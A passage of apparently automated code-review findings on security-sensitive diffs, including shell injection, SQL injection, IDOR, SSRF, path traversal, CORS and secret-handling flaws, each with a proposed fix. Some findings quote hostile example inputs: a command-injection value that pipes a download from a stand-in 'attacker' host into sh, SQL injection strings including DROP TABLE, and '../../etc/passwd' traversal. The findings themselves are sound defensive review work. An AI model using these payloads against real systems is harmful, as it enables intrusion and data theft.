Without the removed `.strip()`, `k` is `" boundary"`, the `k == "boundary"` test on line 5 fails, and `_parse_mime_body` is never called — the multipart body is silently discarded and handlers see no arguments/files. The strip was not redundant.

The security consequence is the asymmetry it creates. An attacker fully controls the Content-Type header, so they can send `multipart/form-data; boundary=A;boundary=B`. Any upstream that normalises whitespace (proxy, WAF, upload scanner, or a differently-implemented service in the same pipeline) selects boundary `A` and parses one set of parts; this code skips `" boundary=A"` and selects `B`, parsing a completely different set of parts. Content that the inspector never saw is what the application actually processes.

Restore the strip (`field.strip().partition("=")`), and ideally also strip the value and reject a Content-Type carrying more than one `boundary` parameter rather than taking the first match.

findings.title: No test covers boundary parsing with leading whitespace
findings.body: The change removes `.strip()` before `partition("=")`, so a field like ` boundary=xyz` (with a leading space after the semicolon split) would now yield k == " boundary" instead of "boundary", failing the `k == "boundary"` check and silently skipping multipart parsing. No test in the diff or referenced exercises a Content-Type header with whitespace around the boundary parameter, so this behavior change would not be caught by any test if it introduced a regression.

findings.title: Error message contains unresolved format placeholder
findings.body: The LocationParseError message on line 7 contains the format string `%s` but provides no argument to substitute. When this exception is raised, users will see the literal text 'Failed to parse: %s' instead of the actual URL that caused the parse failure. This makes the error message useless for debugging. Either restore the `% url` argument that was removed, or replace `%s` with a static error description that does not reference the URL.

findings.title: No test verifies the LocationParseError message content
findings.body: The change removes the `% url` argument from the format string, leaving a literal '%s' unsubstituted (and will raise a TypeError at runtime if the format is ever applied, or silently produce a wrong message). No test in this diff exercises the invalid-port parsing path or asserts on the exception message, so this regression would not be caught by the test suite as it stands.

findings.title: Format placeholder left without argument in LocationParseError message
findings.body: `"Failed to parse: %s"` is no longer interpolated — the `% url` operand was removed but the `%s` placeholder was kept. Every raised `LocationParseError` will now literally read `Failed to parse: %s`, losing the URL that caused the failure and leaking a stray format token into user-visible output. If the intent was to shorten the message, drop the placeholder too (e.g. `LocationParseError(url)` or `LocationParseError("Failed to parse URL")`); if the URL should stay, restore `% url`.

findings.title: Shell command built from unescaped arguments in create_archive
findings.body:
`create_archive` interpolates `name` and `directory` directly into a command string and executes it with `shell=True`. Any shell metacharacter in either value is interpreted by `/bin/sh`: a `directory` of `x; curl attacker/x | sh` or a `name` of `a$(id)` executes arbitrary commands as the service user. The PR description says this backs an "export command" that packs a *named* directory, so the name and directory are expected to come from a request or CLI argument rather than a constant.

Fix by dropping the shell and passing an argument list, mirroring `list_exports` on line 5:

```python
output = os.path.join("/exports", f"{name}.tar.gz")
subprocess.run(["tar", "-czf", output, directory], check=True)
```

Separately, validate `name` against something like `^[A-Za-z0-9_-]+$` before joining it onto `/exports`; even with the list form, a `name` of `../../etc/cron.d/x` writes the tarball outside the export directory, and `directory` should be constrained to a permitted root.

_Also raised by the correctness agent:_ Unquoted shell interpolation breaks on names/paths with spaces

findings.title: No test coverage for create_archive
findings.body: create_archive builds a shell command via string interpolation and executes it with shell=True. There is no test in this diff verifying the resulting command, its safe handling of special characters in name/directory, or that the archive is created as expected. If this function were changed (e.g., the interpolation altered, quoting broken further) nothing would fail.

findings.title: Public function `create_archive` has no docstring
findings.body: The function `create_archive` is a public export-level API (it sits alongside the already-exported `list_exports`) but lacks a docstring explaining its parameters, return value, and behaviour. A caller reading only the name and signature cannot know whether `directory` is sanitized, what exceptions may be raised, or what the return value contains. A docstring should clarify the contract, especially given the sensitive nature of shell command construction.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` allows every origin (`origin: "*"`) while also enabling `credentials: true`, in contrast to the existing export on lines 6-7 which restricts to `ALLOWED`.

Adversary: any website a logged-in user visits. What they control: a cross-origin `fetch(api, { credentials: 'include' })` from their own page. What they get: if the response is readable, the full authenticated API response for the victim's session — session data, PII, whatever the dashboard endpoints return — plus the ability to read CSRF tokens and chain state-changing calls.

A caveat worth stating honestly: with the standard Express `cors` package, `origin: "*"` emits the literal `Access-Control-Allow-Origin: *`, and browsers refuse to expose credentialed responses under a wildcard, so this may currently fail closed and simply break the dashboard rather than expose it. The exposure becomes live the moment the value is changed to a reflecting function/`true`, or a proxy/CDN rewrites the header — which is the natural next step when someone debugs why the dashboard's cookies aren't working.

Fix: give the dashboard its own explicit origin (or add it to `ALLOWED`) rather than `"*"`, and never pair a wildcard with `credentials: true`.

findings.title: Wildcard origin with credentials is rejected by browsers
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. The `cors` middleware will emit `Access-Control-Allow-Origin: *` alongside `Access-Control-Allow-Credentials: true`, and the Fetch/CORS specification forbids that pairing: when a request is made with `credentials: 'include'` (cookies), the browser requires the `Access-Control-Allow-Origin` header to echo the exact origin, and treats `*` as a failure. The preflight/actual response will be blocked client-side and the dashboard's cookie-bearing calls will never succeed \u2014 the change does not achieve what the PR describes.

Echo the specific dashboard origin instead, e.g. add it to the existing `ALLOWED` list used on line 6 and reuse that middleware, or pass a function/array origin that reflects the request origin when it matches the dashboard host. That also avoids the incidental effect of exposing credentialed endpoints to every origin.

findings.title: New dashboardCors config has no test coverage
findings.body: The new `dashboardCors` export combines `origin: "*"` with `credentials: true`, which is invalid per the CORS spec (browsers reject wildcard origin when credentials are allowed) and could silently break the dashboard's authenticated requests. No test exercises this export to catch that misconfiguration or verify the actual response headers produced.

findings.title: Undocumented CORS wildcard-with-credentials configuration
findings.body: The `dashboardCors` export uses `origin: "*"` together with `credentials: true`, which is a non-standard configuration. Modern browsers block credentials transmission with wildcard origins. A comment explaining why this configuration exists and how it is intended to work would prevent misunderstanding or accidental misuse by future maintainers.

findings.title: Live AcmePay secret key hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY = "acme_live_..."` commits a production payment-provider secret to the repository, and line 8 removes the previous `os.environ["ACMEPAY_SECRET_KEY"]` indirection that kept it out of the codebase.

Adversary: anyone with read access to this repository or any artifact derived from it — other employees outside the payments team, CI log/artifact readers, anyone who obtains a clone, and the public if this repo is or becomes public. They control nothing; they simply read the file. What they get: the ability to authenticate to AcmePay as this merchant and issue charges, refunds, or read customer payment data.

Actions: (1) treat this key as compromised and rotate it at AcmePay immediately; (2) restore `os.environ["ACMEPAY_SECRET_KEY"]` (or a secrets manager lookup) inside `client()`; (3) purge the value from git history, since reverting the commit leaves it readable in the object store.

findings.title: Env-based key replaced by a constant; all environments now use one live key
findings.body: `client()` previously resolved the key at call time from `os.environ["ACMEPAY_SECRET_KEY"]`, so each environment (dev, CI, staging, prod) supplied its own credential and a missing credential failed loudly with a `KeyError`. After this change the key is a module-level constant named `acme_live_...`, so every environment — including test and staging runs that previously had a test key or no key at all — will authenticate as the live account and issue real charges. Restore the environment lookup (`os.environ["ACMEPAY_SECRET_KEY"]`, keeping the fail-fast behaviour) and re-add the `import os` that was deleted.

findings.title: client() behavior change has no test exercising it
findings.body: The client() function's key-source changed from environment variable to a hardcoded constant, but the only related change is a fixture file (tests/fixtures/acmepay.py) that defines a fake_client() returning a static dict — it is never called against the real client() function, and no test asserts what acmepay.api_key is set to after calling client(). If client() were reverted to reading from an env var, or set to any wrong value, nothing in this diff would catch it.

findings.title: Function behavior changed without documenting the contract
findings.body: The `client()` function previously read the API key from the environment variable `ACMEPAY_SECRET_KEY`. It now uses a hardcoded module-level constant. This behavioral change should be documented so that callers understand the function no longer respects environment configuration. If environment-based configuration is still expected elsewhere in the codebase, callers may be misled about how the key is determined.

findings.title: fake_client() returns a dict, not a module-like object as client() does
findings.body: `client()` returns the `acmepay` module, so callers use attribute access (e.g. `client().Charge.create(...)`). `fake_client()` returns a plain `dict`, which only supports item access. Any test that substitutes `fake_client()` for `client()` will fail with `AttributeError` rather than exercising the code under test. Consider returning a stub object with the same attribute surface (or a `SimpleNamespace`/`Mock`) so the fixture matches the real return shape.

findings.title: tenant_of returns an unverified, spoofable tenant id
findings.body:
`tenant_of` decodes the token with `options={"verify_signature": False}`, so the returned `tenant_id` is whatever the bearer put in the payload — no signature, and (with verification disabled PyJWT also skips the registered-claim checks by default) no `exp`/`aud` validation either. This is a behavioural divergence from `claims_for` on line 7, which decodes the same token against `public_key()` with `algorithms=["RS256"]`. Any caller that reads a tenant through this helper to scope a query or an authorization decision can be handed an arbitrary tenant by anyone who can mint a base64 payload. If the goal is to avoid a key-store round trip, cache the result of `public_key()` rather than dropping verification; otherwise derive the tenant from `claims_for(token)["tenant_id"]`.

_Also raised by the security agent:_ tenant_of() reads tenant_id from an unverified JWT

findings.title: Public function reads unverified JWT without documenting it
findings.body: The `tenant_of(token)` function reads and returns a claim from a JWT without verifying the signature. The name `tenant_of` does not signal to callers that the token is trusted without cryptographic verification. A caller expecting this function to validate the token before extracting the tenant id would be wrong, potentially exposing the system to token forgery attacks. Add a docstring that explicitly documents that the signature is not verified and explain when this function is safe to use (e.g., only after a separate verification step, or only for logging/metrics).

findings.title: No test covers tenant_of()'s unverified-signature behavior
findings.body: tenant_of() decodes the token with verify_signature=False and returns unverified['tenant_id']. There is no test in this diff exercising this function, so a change that swapped in a verified decode, changed the claim key, or altered error handling on a malformed/missing tenant_id would pass silently. Add a test asserting the returned tenant id for a crafted token, and a test for the missing-claim case (currently raises KeyError uncaught).

findings.title: tenant_of raises KeyError/DecodeError on reachable inputs
findings.body: A token that parses but carries no `tenant_id` claim makes line 12 raise `KeyError`, and a malformed token makes line 11 raise `jwt.DecodeError`. Because signature verification is off, both are reachable from any unauthenticated input rather than only from tokens this service issued. Decide on a contract — return `None`, or raise a domain-specific auth error — so callers are not surprised by a bare `KeyError` escaping the auth layer.

findings.title: update_payment_method mutates object without require_owner check
findings.body:
`update_payment_method` resolves `pm_id` straight from the request into `PaymentMethod.get(pm_id)` and then writes `body["billing_name"]` and calls `pm.save()`, with no ownership check. The adversary is any signed-in user of the service; what they control is the `pm_id` path/route parameter and the request body; what they get is write access to the billing name on any other user's stored payment method — an IDOR that lets them tamper with records they do not own, and (depending on how billing name is displayed downstream) inject content into another user's account page or statements.

Note that `user = current_user(request)` is assigned on line 11 and then never used, which is the tell: the authentication call was copied over from the sibling handler but the authorisation call was dropped. The read handler two lines above does it correctly.

Fix: call `require_owner(user, pm)` immediately after `PaymentMethod.get(pm_id)` and before any mutation, matching line 6.

_Also raised by the correctness agent:_ update_payment_method mutates without require_owner check

_Also raised by the correctness agent:_ Direct indexing of request body raises KeyError on missing field

findings.title: Missing authorization contradicts documented requirement
findings.body: The repository context states: 'Every object mutation must call this' (referring to `require_owner`). The new `update_payment_method` function retrieves a PaymentMethod and mutates it (lines 13–14) without calling `require_owner`. This violates the documented contract that every object mutation must perform ownership authorization. The existing `get_payment_method` function on line 6 correctly calls `require_owner` after fetching; this function should too.

findings.title: No test exercises update_payment_method's authorization/ownership behavior
findings.body: update_payment_method is new and, unlike get_payment_method above it, never calls require_owner(user, pm) before mutating and saving. No test file is included in this diff, so there is nothing that would fail if a user could update another user's payment method, and nothing that would catch a future accidental removal of an authz check if one were added later. Add a test asserting that a non-owner calling update_payment_method raises Forbidden, and one asserting an owner succeeds.

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body:
`request_reset` is an unauthenticated entry point: the caller supplies `email` and it flows directly into `send_reset_email(email)` on line 2 with no throttle between them now that the `@rate_limit("5/hour")` decorator is gone.

Adversary: any anonymous client that can reach this endpoint. What they control: the `email` value and the request rate. What they get: (a) unbounded reset mail directed at any address they choose — mailbox flooding/harassment of a chosen victim and sender-reputation damage to your domain; (b) free generation of an arbitrary number of live reset tokens, which amplifies any weakness in token entropy or expiry; (c) if the response or timing differs for known vs. unknown addresses, unlimited account enumeration.

The PR rationale — "the email provider already throttles" — does not substitute for this control. Provider-side throttling is typically a per-sender sending quota; it does not bound requests per client IP or per target address, and when it does engage it degrades reset delivery for all legitimate users rather than blocking the abuser. If the decorator is being removed for a reason (e.g. moving to a shared gateway), the replacement limiter should be visible; otherwise restore `@rate_limit` and consider keying it on both source IP and target address.

findings.title: Password reset endpoint left with no per-caller bound after limiter removal
findings.body:
`request_reset` previously carried `@rate_limit("5/hour")`; the decorator and its import are removed, so every call now reaches `send_reset_email(email)` unconditionally and returns `{"sent": True}` regardless of volume.

The PR rationale — "the email provider already throttles" — is not an equivalent control:
- Provider throttles are typically per-sending-account and global, so they cap total outbound volume but do not stop N requests targeting one victim's address. Reset-email flooding of a single user remains possible.
- When the provider does start throttling, it does so by rejecting or queueing sends inside `send_reset_email`. This function still returns `{"sent": True}` on that path, so the caller is told the mail went out when it did not.
- The unbounded endpoint is also an unmetered probe: each call does work proportional to whether the address exists, with no cost ceiling.

If the limiter genuinely must move, put the bound where it is enforceable and observable — keep a per-email/per-IP limit on this handler, or have `send_reset_email` surface provider rejection so the return shape reflects reality. Deleting it outright removes the only bound this code had.

findings.title: No test guards against loss of rate limiting on password reset
findings.body: The @rate_limit decorator was removed from request_reset with no accompanying test changes. If this removal is wrong (e.g., email provider throttling is insufficient or absent for some paths), nothing in the test suite would catch a resumed flood of reset requests, since no test appears to have exercised the rate-limit behavior before or after this change.

findings.title: Preview path skips _confined(), allowing traversal outside EXPORT_ROOT
findings.body:
The download function two lines above resolves its target with `path = _confined(name)`, which is evidently the helper that keeps `name` inside `EXPORT_ROOT`. `read_export_preview` instead does `os.path.join(EXPORT_ROOT, name)` with no validation. `os.path.join` does not normalise: a `name` of `../../etc/passwd` yields a path outside the root, and an absolute `name` such as `/etc/passwd` discards `EXPORT_ROOT` entirely. Since `name` is the request-supplied export identifier, the preview endpoint reads arbitrary files and returns the first `limit` bytes to the caller. The PR description says the preview "reuses the same layout as download" \u2014 it should reuse the same confinement: replace line 20 with `path = _confined(name)`.

_Also raised by the security agent:_ Preview path skips _confined(), allowing path traversal read

findings.title: No test would catch preview skipping path confinement
findings.body: read_export_preview builds path via os.path.join(EXPORT_ROOT, name) instead of calling _confined(name) like the download function above it. There is no test in this diff exercising read_export_preview with a traversal-style name (e.g. '../secret'), so a regression or an existing bug here would pass silently.

findings.title: Ownership check removed from bulk_export enables cross-tenant reads
findings.body:
`bulk_export` now fetches every `Report` named in the caller-supplied `report_ids` and serialises it with no authorisation step. The removed loop called `require_owner(user, report)`, which per `api/auth.py` raises `Forbidden` when `obj.tenant_id != user.tenant_id` and is documented as mandatory for "every object read or mutation of another tenant's data".

Adversary: any user who can authenticate (a low-privilege customer account, or anyone with a stolen session). What they control: the `report_ids` list in the request — IDs are enumerable or guessable. What they get: the full `to_dict()` payload of arbitrary reports belonging to other tenants, in bulk, one request per batch.

Authentication (`current_user`) is not authorisation; it only establishes who is asking, not whether they may read *these* objects. Restore the check before serialising. If the loop was genuinely the bottleneck, keep the control and push it into the data layer — e.g. fetch with `Report.filter(id__in=report_ids, tenant_id=user.tenant_id)` and return `Forbidden`/404 when the returned count differs from the requested count — rather than dropping it.

_Also raised by the correctness agent:_ bulk_export no longer checks report ownership before returning data

findings.title: No test catches removal of require_owner authorization check
findings.body: bulk_export previously called require_owner(user, report) for each report, enforcing tenant isolation per api/auth.py's docstring ('Every object read or mutation of another tenant's data must go through this'). This call has been removed with no test added or updated to verify that cross-tenant report IDs are now rejected or still rejected. If this change is wrong (i.e., the check should not have been removed), nothing in the current diff would fail — there is no test exercising bulk_export with a report belonging to another tenant.

findings.title: Public function `bulk_export` lacks documented contract for authorization
findings.body:
The `bulk_export` function is a public endpoint that accepts `report_ids` from a caller and returns report data. The function previously enforced per-report ownership checks via `require_owner()`, ensuring callers could only access their own tenant's data. This check has been removed without documentation of the new authorization contract.

A competent caller cannot determine from the function signature and name alone whether they are permitted to request arbitrary `report_ids`, or whether some authorization still applies. The PR description claims "callers are already authenticated," but authentication (knowing who they are) is distinct from authorization (what they can access). Without documented clarification that the function now trusts callers to pass only IDs they own, or that some other layer enforces this, callers may use this function incorrectly and either leak data across tenants or be blocked by an authorization layer they do not know exists.

Add a docstring to `bulk_export` that documents its authorization contract: either that callers must pre-filter to owned reports, or that the function now assumes the request context carries authorization scope.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` interpolates `term` and `status` directly into the SQL string and calls `execute(sql)` with no params. Both values land inside single-quoted literals, so a caller-supplied value containing a `'` terminates the literal and the rest is parsed as SQL — e.g. `status = "x' OR '1'='1"` returns every customer row, and `term = "%'; DROP TABLE customers; --"` reaches a second statement if the driver permits multi-statement execution. The PR description says this is a support-facing name/status search, so the two operands are exactly the free-text fields a request body or query string supplies.

Fix by using the same parameterised form as `get_customer` on line 5 and letting the driver quote the wildcards:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

If `status` is drawn from a fixed set, additionally validate it against an allowlist.

findings.title: Function violates documented execute() contract
findings.body: The `search_customers` function calls `execute(sql)` without the `params` argument, directly contradicting the documented contract of `execute()` which states '`params` must carry every caller value.' The SQL string on line 9 uses f-string interpolation instead of parameterised queries, which breaks the module's documented API pattern.

findings.title: search_customers bypasses execute()'s required params contract
findings.body:
`billing.db.execute` documents "Run a parameterised query. `params` must carry every caller value." and the sibling `get_customer` on line 5 follows it (`execute("... id = %s", (customer_id,))`). `search_customers` builds the whole statement with an f-string and calls `execute(sql)` with no params, so every caller value is baked into the SQL text.

Beyond the contract violation this is wrong for ordinary inputs: a term like `O'Brien` closes the quoted literal and yields syntactically invalid SQL, and a `term` of `None` renders the literal string `%None%` rather than matching nothing/everything as intended. Also, any `%` or `_` a user types is silently treated as a LIKE wildcard.

Fix by keeping the query parameterised, e.g. `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", (f"%{term}%", status))`, escaping LIKE metacharacters in `term` if literal matching is wanted.

findings.title: search_customers has no test coverage
findings.body: The new search_customers function builds SQL via f-string interpolation of `term` and `status` directly into the query text, bypassing the parameterised `execute` helper (which the repo's own docstring says must carry every caller value). No test exists that would catch this: a test asserting correct results for benign input would pass regardless of the injection-prone construction, and there is no test exercising special characters (e.g. a quote in `term` or `status`) that would surface the broken/incorrect query. As written, nothing in the change set would fail if this function were wrong.

findings.title: verify_endpoint skips the ALLOWED_HOSTS check the send path enforces
findings.body:
The existing send path establishes the invariant that any tenant-supplied URL must resolve to a host in `ALLOWED_HOSTS` before an outbound request is made (lines 8-9). `verify_endpoint` takes the same kind of tenant-controlled `url` and calls `requests.get` on it directly, so the invariant no longer holds for every outbound request in this module. A tenant registering a URL pointing at an internal address (link-local metadata endpoints, internal admin services) gets the server to fetch it, and the returned status code leaks whether the internal target exists. Route this through the same host extraction and allowlist check used above before issuing the request, and disable redirect following (`allow_redirects=False`) so a permitted host cannot bounce the request to a disallowed one.

_Also raised by the security agent:_ verify_endpoint bypasses the ALLOWED_HOSTS allowlist (SSRF)

findings.title: verify_endpoint has no test covering its behavior
findings.body: verify_endpoint is a new function that performs an outbound GET and returns a status code, but no test exercises it. Unlike the existing post-based send path (which checks ALLOWED_HOSTS before line 8), this function has no visible host validation and no test would catch it silently regressing (e.g. if validation is later added and breaks, or if it is called with unexpected input). Since this touches webhook destination handling — a security-sensitive path — an untested regression here (wrong status handling, missing validation, wrong timeout) would ship unnoticed.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: A function named `verify_endpoint` that returns a status code reads as "tell me whether this endpoint is healthy", but for the most common failure cases it never returns: a malformed URL raises `MissingSchema`/`InvalidURL`, an unreachable host raises `ConnectionError`, and a slow host raises `Timeout` at the 5s mark. Callers that do `if verify_endpoint(url) == 200:` will see an exception propagate out of the registration flow rather than a failed verification. Wrap the call in `except requests.RequestException` and return `None` (or a sentinel) so the caller can distinguish "responded with an error status" from "could not be reached".

findings.title: Invoices bucket added with all public access blocks disabled
findings.body:
The change declares `aws_s3_bucket.invoices` (`acme-customer-invoices`) and immediately attaches an `aws_s3_bucket_public_access_block` with all four guards set to `false`. Setting all four to `false` removes the account/bucket-level backstop, so any ACL or bucket policy that grants `*` on this bucket will take effect and customer invoices become world-readable. This is not what the PR describes — the description is about a public assets bucket for the marketing site; a customer-invoices bucket is a different concern and almost certainly should not be here, and certainly should not have the public access block neutered.

If the invoices bucket genuinely belongs in this change, it should either omit the `aws_s3_bucket_public_access_block` resource entirely (so the account-level default applies) or set all four attributes to `true`. Only the `assets` bucket has an evident reason to relax these.

_Also raised by the security agent:_ Customer invoices bucket created with all public access blocks disabled

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same hex digest as `verify_stripe` but validates it with `expected == header`. Python's string `==` short-circuits on the first differing byte, so comparison time leaks how many leading characters of the signature are correct, allowing an attacker who can submit repeated webhooks to recover a valid signature byte by byte without knowing the secret. The adjacent `verify_stripe` on line 7 already does this correctly.

A secondary consequence: if `header` arrives as `bytes` (common when read straight off a raw header/frame) `expected == header` quietly returns `False`, whereas `hmac.compare_digest` would raise `TypeError` and surface the mismatch. So the `==` form can also turn a type bug into a silent "invalid signature" for all traffic.

Change line 12 to `return hmac.compare_digest(expected, header)`.

_Also raised by the security agent:_ Webhook signature compared with `==` instead of compare_digest

findings.title: Undocumented timing-unsafe comparison in verify_acmepay
findings.body: The verify_acmepay function uses `==` for HMAC comparison (line 12), which is timing-unsafe and vulnerable to timing attacks, while the verify_stripe function above it uses `hmac.compare_digest` (line 7) to prevent this. This critical semantic difference between two functions with parallel signatures and purposes is not documented. A caller copying the verify_stripe pattern to verify_acmepay, or assuming both provide the same security guarantees, would silently introduce a vulnerability. Add a docstring to verify_acmepay explaining why it differs from verify_stripe, or better: use `hmac.compare_digest` consistently.

findings.title: New verify_acmepay function has no test coverage
findings.body: The new verify_acmepay function introduces webhook signature verification logic but no test is added for it in this diff. In particular, nothing would catch that it uses `==` instead of `hmac.compare_digest` like its sibling verify_stripe, so a regression or the current behavior difference would go unnoticed.

findings.title: Stack trace and exception text returned to the client on 500
findings.body:
`handle()` previously returned a fixed `"internal error"` string; it now serialises `str(exc)` and `traceback.format_exc()` into the response body. Any client who can provoke an unhandled exception — typically by sending malformed input to a public endpoint — receives absolute filesystem paths, module and function names, source line numbers, and dependency internals. Exception messages frequently embed sensitive operational data as well: DB driver errors carry host/user and sometimes the connection string, HTTP client errors carry internal URLs and occasionally auth headers, and `KeyError`/`ValueError` messages can carry fragments of the offending data.

The stated goal (on-call visibility without SSHing in) is already met by the `log.exception("request failed")` on line 8 — the trace is in the log pipeline. Keep the client-facing body opaque and correlate via an identifier instead:

```python
def handle(exc):
    request_id = uuid.uuid4().hex
    log.exception("request failed", extra={"request_id": request_id})
    return {"error": "internal error", "request_id": request_id}, 500
```

If verbose bodies are genuinely wanted for local work, gate them on an explicit debug setting that is off by default in production rather than emitting them unconditionally.

_Also raised by the correctness agent:_ 500 response body shape and value changed for existing callers

_Also raised by the correctness agent:_ traceback.format_exc() yields "NoneType: None" outside an except block

findings.title: No test covers the new error response contents
findings.body: The change alters the public contract of handle() from a fixed generic error body to one that includes str(exc) and a full traceback. There is no test in this diff verifying the returned dict/status code, so a regression (e.g. reverting to generic message, or a bug in formatting) would not be caught. Given this is a security-sensitive behavior change (exposing internals), it especially warrants a regression test asserting the exact response shape.

findings.title: Reset-path passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a stored credential with a single unsalted MD5 pass, while `hash_password` two lines above uses bcrypt with a per-password salt. Anyone who obtains the stored value — via a SQL injection, a leaked backup, a misconfigured replica, or an insider with read access to the table — recovers the plaintext password: unsalted MD5 is precomputed in public rainbow tables and brute-forces at billions of guesses per second on commodity GPUs. Because users reuse passwords, this also compromises accounts on other services.

There is no reason for the reset path to use a different primitive from the login path. Delete this function and call `hash_password` (bcrypt) for reset-set passwords. If the intent was to hash a *reset token* rather than a password, the name and the parameter `raw` should say so, and it should still use a salted, constant-time-comparable construction (e.g. `hashlib.sha256` over a 128-bit random token, compared with `hmac.compare_digest`) — not MD5.

findings.title: Reset hash returns MD5 hex, incompatible with bcrypt verification
findings.body: `hash_password` (line 7) returns a bcrypt-formatted string (`$2b$...`, 60 chars), whereas the new `hash_reset_password` returns a 32-char MD5 hex digest. Anything that stores these in the same credential column and verifies with `bcrypt.checkpw` will fail for reset-created hashes \u2014 `bcrypt.checkpw` raises `ValueError: invalid salt` on a non-bcrypt digest rather than returning `False`, so the failure surfaces as a 500 rather than a rejected login. No matching `verify_*` helper was added in this diff, so either verification is done elsewhere against the bcrypt format (broken) or there is no verification path for reset hashes at all. Produce reset hashes with `hash_password` so a single verifier handles both, or add the corresponding verify function and make the storage format explicit.

findings.title: New password-reset hashing path has no test coverage
findings.body: hash_reset_password is a new public function introducing weak/reversible hashing behavior for password resets, but no test exercises it. Nothing would fail if this function were removed, changed to a no-op, or swapped for a different (even incorrect) hash algorithm. Add a test asserting the output format/determinism expected of this function so future changes to it are caught.

findings.title: pull_request_target checks out and runs fork code with secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to `secrets` and a read/write `GITHUB_TOKEN`, and it is triggered by anyone who opens a pull request from a fork — no approval or maintainer interaction required. Lines 11–12 then deliberately check out `github.event.pull_request.head.sha`, i.e. the attacker's commit, and line 13 executes `./scripts/measure.sh` from that checkout with `NPM_TOKEN` injected on lines 14–15.

An external contributor only has to open a PR whose branch modifies `scripts/measure.sh` (or any file it sources, or a `package.json` lifecycle hook / dependency it installs) to get arbitrary shell execution on your runner. From there they can exfiltrate `NPM_TOKEN` (publish rights to your packages), read every other secret available to the job, and use the write-scoped `GITHUB_TOKEN` to push commits or tamper with releases.

To give forks the same CI signal safely, keep `on: pull_request` — it runs untrusted code with no secrets and a read-only token, which is exactly what a size measurement needs. If `pull_request_target` is genuinely required for something (e.g. posting a comment), split it: an untrusted `pull_request` job that builds and uploads an artifact, and a separate trusted job that never checks out fork code. At minimum, never combine `pull_request_target` + checkout of `head.sha` + execution of code from that checkout, and do not pass `NPM_TOKEN` to a job running untrusted code.

_Also raised by the correctness agent:_ pull_request_target + fork head checkout + secret = arbitrary code execution

findings.title: Size is now measured on the PR head, not the merge result
findings.body: Under the previous `pull_request` trigger, `actions/checkout` defaults to `refs/pull/N/merge` — the base branch merged with the PR. Pinning `ref` to `github.event.pull_request.head.sha` changes what is measured to the raw PR head, so the reported size no longer reflects what would land after merge and will drift from the base branch as it moves. If the check is used as a gate against a size budget, the number it produces is not the post-merge number any more. If measuring the merge result is intended, resolve and check out the merge ref instead of the head SHA (noting that under `pull_request_target` the merge ref is still attacker-influenced content).

findings.title: Digest key rejects contexts the old tuple key accepted
findings.body: The previous key `(template_source, tuple(sorted(context.items())))` worked for any context whose keys/values were hashable and orderable — `datetime`, `Decimal`, `UUID`, enums, custom objects with `__hash__`. `json.dumps` raises `TypeError: Object of type X is not JSON serializable` for all of those, so `cached_render` now throws for callers that previously rendered fine. If arbitrary context values are possible, either pass `default=repr`/a custom encoder, or fall back to the tuple key when serialisation fails.

findings.title: No test covers context values incompatible with json.dumps
findings.body: The key derivation changed from `tuple(sorted(context.items()))` to `json.dumps([template_source, context], sort_keys=True)`. This narrows the set of contexts that `cached_render` can accept: any context containing non-JSON-serializable values (tuples, sets, datetimes, custom objects, non-string keys) will now raise a TypeError at cache-key time, whereas the old sorted-tuple approach would have worked as long as items were hashable/sortable. None of the new or existing tests pass a context with such a value, so this regression in accepted input types would not be caught by the test suite.

findings.title: New test depends on _CACHE being cleared between tests
findings.body: `_CACHE` is a module-level dict that is never reset by `cached_render`. `test_different_context_renders_again` renders `("{{ a }}", {"a": 1})`, which is the exact input already cached by the first test in this file; unless the `counter` fixture also clears `render.cache._CACHE`, that call is a hit and `counter.renders` will be 1, not 2, making the assertion fail (or pass only because of test ordering). If the fixture does not already do it, add an explicit `_CACHE.clear()` in the fixture.

findings.title: Test only asserts shell=False, never checks the actual argv list
findings.body: `test_runs_without_a_shell` calls `create_archive` and asserts only `spy.last_call.kwargs["shell"] is False`. It never inspects `spy.last_call.args` (or however the command list is exposed) to verify that `name` and `directory` were placed correctly into the argv list, that the `--` separator is present, or that the archive path is correctly formed. If the argv construction in `create_archive` regressed — e.g. dropped the `--` separator, swapped the name/directory order, or reintroduced string interpolation into a single arg — this test would still pass because it only checks the `shell` kwarg on a mock/spy. It is effectively an assertion-on-a-mock test that doesn't validate the behavior the PR is actually about (correct list-based argv).

findings.title: `directory` is no longer word-split or glob-expanded
findings.body: With `shell=True` the old command let the shell split `directory` on whitespace and expand globs, so a caller passing `"/srv/a /srv/b"` or `"/srv/data/*"` archived multiple paths. With a list argv the whole string is one literal operand, so those calls now fail with `tar: ...: Cannot stat: No such file or directory` and `check=True` raises `CalledProcessError` — a runtime break, not a validation error. If any caller passes multiple paths or a pattern, change the parameter to accept a sequence of directories and splat it into the argv (e.g. `["tar", "-czf", dest, "--", *directories]`).

findings.title: Allowlist rejects names the old code accepted (dots, >64 chars)
findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]{1,64}`. The previous implementation accepted any string, so plausible existing names such as `2024-01-01.nightly` (contains `.`), `customer exports`, or any name longer than 64 characters now raise `ValueError` instead of producing an archive. `create_archive` previously raised only `CalledProcessError`, so callers are unlikely to catch `ValueError` and the failure will surface as an unhandled exception. If dotted or longer names are in use, widen the class (e.g. add `.` and raise the length bound) or reject only path separators and leading `-`; otherwise confirm no caller passes such a name.

findings.title: `directory` is unvalidated; may allow archiving arbitrary paths
findings.body: `name` is now tightly allowlisted, but `directory` flows straight into the tar argv with no constraint. Injection is genuinely gone (list argv, `shell=False`, and `--` stops `-`-prefixed values being read as options), so this is not a command-execution issue. The residual risk is scope: if a caller passes a request-supplied path, an attacker can make tar read any directory the service can read (e.g. `/etc`, `/root/.ssh`) and have it written to a predictable, possibly downloadable location under `/exports/<name>.tar.gz`. If `directory` is always internally derived, this is a non-issue. Consider resolving the path and asserting it stays under an expected export root, mirroring the treatment `name` already gets.

findings.title: Test asserts nothing — cannot fail
findings.body:
